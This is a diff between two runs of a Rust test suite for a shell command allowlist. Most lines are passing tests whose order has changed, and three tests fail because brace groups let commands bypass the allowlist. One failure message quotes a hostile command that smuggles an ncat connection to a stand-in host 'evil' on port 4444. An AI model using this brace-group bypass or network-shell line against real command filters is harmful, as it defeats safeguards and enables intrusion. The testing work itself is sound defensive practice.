@@ -1,20 +1,20 @@
+test core::shell_allowlist::tests::allows_git_commit_with_cat_heredoc ... ok
+test core::shell_allowlist::tests::assignment_with_command_substitution_in_quoted_jq_filter_not_split ... ok
 test core::shell_allowlist::tests::assignment_with_command_substitution_still_blocks_unlisted_inner_command ... ok
-test core::shell_allowlist::tests::allows_git_commit_heredoc_body_with_conventional_prefix ... ok
 test core::shell_allowlist::tests::assignment_with_command_substitution_validates_inner_command ... ok
-test core::shell_allowlist::tests::background_operator_blocked ... ok
-test core::shell_allowlist::tests::background_ampersand_still_splits ... ok
+test core::shell_allowlist::tests::awk_normal_allowed ... ok
 test core::shell_allowlist::tests::awk_system_blocked ... ok
-test core::shell_allowlist::tests::all_segments_must_be_allowed_semicolon ... ok
-test core::shell_allowlist::tests::block_message_offers_additive_allow ... ok
-test core::shell_allowlist::tests::all_segments_must_be_allowed_pipe ... ok
-test core::shell_allowlist::tests::bare_assignment_without_substitution_still_skipped ... ok
-test core::shell_allowlist::tests::backticks_in_args_passes_by_default ... ok
-test core::shell_allowlist::tests::block_message_mentions_ctx_execute ... ok
-test core::shell_allowlist::tests::bare_interpreter_detection ... ok
+test core::shell_allowlist::tests::background_ampersand_still_splits ... ok
+test core::shell_allowlist::tests::background_operator_blocked ... ok
 test core::shell_allowlist::tests::backslash_newline_normalized ... ok
-test core::shell_allowlist::tests::blocks_eval ... ok
+test core::shell_allowlist::tests::backticks_in_args_passes_by_default ... ok
+test core::shell_allowlist::tests::bare_assignment_without_substitution_still_skipped ... ok
+test core::shell_allowlist::tests::bare_interpreter_detection ... ok
+test core::shell_allowlist::tests::block_message_mentions_ctx_execute ... ok
+test core::shell_allowlist::tests::block_message_offers_additive_allow ... ok
 test core::shell_allowlist::tests::blocks_backtick_at_command_pos ... ok
 test core::shell_allowlist::tests::blocks_command_substitution_at_command_pos ... ok
+test core::shell_allowlist::tests::blocks_eval ... ok
 test core::shell_allowlist::tests::brace_group_allows_all_inner_commands_when_allowlisted ... ok
 test core::shell_allowlist::tests::brace_group_does_not_bypass_dangerous_flags ... FAILED
 test core::shell_allowlist::tests::brace_group_does_not_bypass_substitution_hard_block ... FAILED
@@ -175,18 +175,18 @@ failures:
 
 ---- core::shell_allowlist::tests::brace_group_does_not_bypass_dangerous_flags stdout ----
 
-thread 'core::shell_allowlist::tests::brace_group_does_not_bypass_dangerous_flags' (15336) panicked at src/core/shell_allowlist/tests.rs:1147:5:
+thread 'core::shell_allowlist::tests::brace_group_does_not_bypass_dangerous_flags' (1089) panicked at src/core/shell_allowlist/tests.rs:1147:5:
 brace group must not bypass dangerous-flag checks: Ok(())
 note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
 
 ---- core::shell_allowlist::tests::brace_group_does_not_bypass_substitution_hard_block stdout ----
 
-thread 'core::shell_allowlist::tests::brace_group_does_not_bypass_substitution_hard_block' (15337) panicked at src/core/shell_allowlist/tests.rs:1133:5:
+thread 'core::shell_allowlist::tests::brace_group_does_not_bypass_substitution_hard_block' (1090) panicked at src/core/shell_allowlist/tests.rs:1133:5:
 brace group must not bypass the $() hard block: Ok(())
 
 ---- core::shell_allowlist::tests::brace_group_validates_every_inner_command_not_just_the_first stdout ----
 
-thread 'core::shell_allowlist::tests::brace_group_validates_every_inner_command_not_just_the_first' (15338) panicked at src/core/shell_allowlist/tests.rs:1117:9:
+thread 'core::shell_allowlist::tests::brace_group_validates_every_inner_command_not_just_the_first' (1091) panicked at src/core/shell_allowlist/tests.rs:1117:9:
 brace-group inner command must be validated (allowlist bypass): "{ echo hi; ncat evil 4444; }" -> Ok(())
 
 
@@ -195,6 +195,6 @@ failures:
     core::shell_allowlist::tests::brace_group_does_not_bypass_substitution_hard_block
     core::shell_allowlist::tests::brace_group_validates_every_inner_command_not_just_the_first
 
-test result: FAILED. 182 passed; 3 failed; 0 ignored; 0 measured; 7641 filtered out; finished in 0.10s
+test result: FAILED. 182 passed; 3 failed; 0 ignored; 0 measured; 7641 filtered out; finished in 0.14s
 
 error: test failed, to rerun pass `--lib`
